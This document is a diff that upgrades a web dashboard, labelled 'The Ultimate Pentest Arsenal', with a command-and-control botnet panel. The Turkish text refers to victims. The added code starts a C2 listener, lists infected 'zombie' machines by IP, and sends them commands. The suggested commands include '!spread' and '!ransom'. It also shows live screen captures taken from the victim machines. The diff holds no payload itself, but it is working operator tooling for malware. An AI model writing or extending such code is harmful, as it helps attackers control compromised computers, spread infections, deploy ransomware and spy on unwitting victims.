@@ -290,7 +290,12 @@
             <div style="font-size: 0.7rem; color: var(--success-color); margin-top: 5px;">● SYSTEM ONLINE</div>
         </div>
         <div class="sidebar-menu" id="sidebar-menu">
-            <!-- Kategoriler JS ile buraya yüklenecek -->
+            <div class="menu-item" id="menu-item-botnet" onclick="renderBotnet()">
+                <i class="fa-solid fa-spider"></i>
+                <span style="color: var(--danger-color); font-weight: bold;">Zombies (C2 Botnet)</span>
+            </div>
+            <div style="border-bottom: 1px solid #333; margin: 10px 0;"></div>
+            <div id="dynamic-menu"></div>
         </div>
     </div>
 
@@ -300,20 +305,50 @@
         </div>
         
         <div class="content-area">
+            <div id="botnet-container" style="display: none; flex-direction: column; gap: 20px;">
+                <div class="card" style="border-color: var(--danger-color);">
+                    <h3><i class="fa-solid fa-network-wired"></i> C2 Listener Control</h3>
+                    <p>Web tabanlı C2 Listener'ı başlatın. Kurbanlar bu porta bağlanacaktır.</p>
+                    <div style="display: flex; gap: 10px;">
+                        <input type="text" id="c2-port-input" class="form-control" placeholder="Dinlenecek Port (Örn: 443)" value="443" style="width: 200px;">
+                        <button class="btn" style="width: auto;" onclick="startC2Listener()"><i class="fa-solid fa-play"></i> Dinlemeyi Başlat</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <h3><i class="fa-solid fa-users-viewfinder"></i> Active Zombies <span id="bot-count" style="background: var(--danger-color); padding: 2px 8px; border-radius: 10px; font-size: 0.8rem; margin-left: auto;">0</span></h3>
+                    <div id="bots-list" style="display: flex; flex-direction: column; gap: 10px; margin-top: 15px;">
+                        <!-- Bots will be listed here -->
+                    </div>
+                </div>
+            </div>
+
             <div class="tools-grid" id="tools-grid">
                 <!-- Araç kartları JS ile buraya yüklenecek -->
             </div>
 
-            <div class="terminal-container">
+            <div class="terminal-container" id="terminal-container">
                 <div class="terminal-header">
-                    <span><i class="fa-solid fa-terminal"></i> root@arsenal:~#</span>
+                    <span id="term-prompt"><i class="fa-solid fa-terminal"></i> root@arsenal:~#</span>
                     <span id="term-status" style="color: var(--success-color);">Idle</span>
                 </div>
                 <div class="terminal-content" id="terminal-content">
-The Ultimate Pentest Arsenal - Web Dashboard v5.0
+The Ultimate Pentest Arsenal - Web Dashboard v6.0
 Initialize sequence completed. Awaiting commands...
                 </div>
+                <div style="display: flex; border-top: 1px solid #333; background: #000;">
+                    <input type="text" id="bot-cmd-input" placeholder="Komut yazın (örn: !spread, !ransom, dir, whoami)..." style="flex:1; background: transparent; border: none; color: var(--terminal-text); padding: 10px; font-family: monospace; outline: none; display: none;" onkeypress="handleBotCmd(event)">
+                </div>
             </div>
+            
+            <!-- Live Stream Modal -->
+            <div id="stream-modal" style="display:none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.9); z-index: 1000; flex-direction: column; align-items: center; justify-content: center;">
+                <div style="width: 80%; display: flex; justify-content: space-between; margin-bottom: 10px;">
+                    <h3 style="color: var(--danger-color); margin: 0;"><i class="fa-solid fa-video"></i> Live Screen Stream</h3>
+                    <button onclick="document.getElementById('stream-modal').style.display='none'" class="btn" style="width: auto; padding: 5px 15px;">Kapat</button>
+                </div>
+                <img id="stream-img" src="" style="max-width: 80%; max-height: 80vh; border: 2px solid var(--accent-color); border-radius: 8px;">
+            </div>
+
         </div>
     </div>
 
@@ -380,7 +415,111 @@ Initialize sequence completed. Awaiting commands...
             });
         }
 
+        let currentBotId = null;
+        let botPollInterval = null;
+
+        function startC2Listener() {
+            const port = document.getElementById('c2-port-input').value;
+            fetch('/api/c2/start', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ port: port })
+            }).then(r => r.json()).then(d => {
+                appendToTerminal(`[C2] ${d.message}`);
+                pollBots();
+            });
+        }
+
+        function pollBots() {
+            if(botPollInterval) clearInterval(botPollInterval);
+            botPollInterval = setInterval(() => {
+                fetch('/api/c2/bots').then(r => r.json()).then(d => {
+                    if(d.status === "success") {
+                        document.getElementById('bot-count').innerText = d.bots.length;
+                        const botsList = document.getElementById('bots-list');
+                        botsList.innerHTML = '';
+                        if(d.bots.length === 0) {
+                            botsList.innerHTML = '<div style="color: #6b7280; font-size: 0.9rem;">Bağlı kurban bulunmuyor.</div>';
+                        }
+                        d.bots.forEach(bot => {
+                            botsList.innerHTML += `
+                                <div style="display: flex; justify-content: space-between; align-items: center; background: #1f2937; padding: 10px; border-radius: 6px; border-left: 3px solid var(--danger-color);">
+                                    <div>
+                                        <strong><i class="fa-solid fa-desktop"></i> Zombie_${bot.id}</strong>
+                                        <div style="font-size: 0.8rem; color: #9ca3af;">IP: ${bot.ip}:${bot.port}</div>
+                                    </div>
+                                    <button class="btn" style="width: auto; padding: 5px 15px;" onclick="interactBot('${bot.id}')">Interact</button>
+                                </div>
+                            `;
+                        });
+                    }
+                    
+                    if(currentBotId) {
+                        fetch(`/api/c2/output/${currentBotId}`).then(r => r.json()).then(out => {
+                            if(out.status === "success") {
+                                if(out.output) appendToTerminal(out.output);
+                                if(out.stream_frame) {
+                                    document.getElementById('stream-modal').style.display = 'flex';
+                                    document.getElementById('stream-img').src = "data:image/jpeg;base64," + out.stream_frame;
+                                }
+                            } else {
+                                currentBotId = null;
+                                document.getElementById('bot-cmd-input').style.display = 'none';
+                                document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
+                                appendToTerminal("[C2] Bot connection lost.");
+                            }
+                        });
+                    }
+                });
+            }, 2000);
+        }
+
+        function interactBot(botId) {
+            currentBotId = botId;
+            document.getElementById('bot-cmd-input').style.display = 'block';
+            document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-skull"></i> zombie_${botId}:~#`;
+            appendToTerminal(`\n[+] Interacting with zombie_${botId}... Type '!help' or commands.`);
+        }
+
+        function handleBotCmd(e) {
+            if(e.key === 'Enter') {
+                const cmd = e.target.value;
+                e.target.value = '';
+                if(!currentBotId) return;
+                
+                appendToTerminal(`\n<span style="color:yellow">> ${cmd}</span>`, true);
+                
+                fetch('/api/c2/send_cmd', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ bot_id: currentBotId, cmd: cmd })
+                }).then(r=>r.json()).then(d=>{
+                    if(d.status !== "success") appendToTerminal(`[!] Error sending command: ${d.message}`);
+                });
+            }
+        }
+
+        function renderBotnet() {
+            topbarTitle.innerHTML = `<i class="fa-solid fa-spider"></i> Zombies (Botnet Control)`;
+            document.getElementById('tools-grid').style.display = 'none';
+            document.getElementById('botnet-container').style.display = 'flex';
+            
+            document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active'));
+            document.getElementById(`menu-item-botnet`).classList.add('active');
+            
+            currentBotId = null;
+            document.getElementById('bot-cmd-input').style.display = 'none';
+            document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
+            pollBots();
+        }
+
         function renderCategory(categoryIndex) {
+            document.getElementById('tools-grid').style.display = 'grid';
+            document.getElementById('botnet-container').style.display = 'none';
+            currentBotId = null;
+            document.getElementById('bot-cmd-input').style.display = 'none';
+            document.getElementById('term-prompt').innerHTML = `<i class="fa-solid fa-terminal"></i> root@arsenal:~#`;
+            
             const category = CONFIG[categoryIndex];
             topbarTitle.innerHTML = `<i class="fa-solid ${category.icon}"></i> ${category.category}`;
             toolsGrid.innerHTML = '';
@@ -419,9 +558,10 @@ Initialize sequence completed. Awaiting commands...
         }
 
         function initSidebar() {
-            sidebarMenu.innerHTML = '';
+            const dynamicMenu = document.getElementById('dynamic-menu');
+            dynamicMenu.innerHTML = '';
             CONFIG.forEach((cat, index) => {
-                sidebarMenu.innerHTML += `
+                dynamicMenu.innerHTML += `
                     <div class="menu-item" id="menu-item-${index}" onclick="renderCategory(${index})">
                         <i class="fa-solid ${cat.icon}"></i>
                         <span>${cat.category}</span>
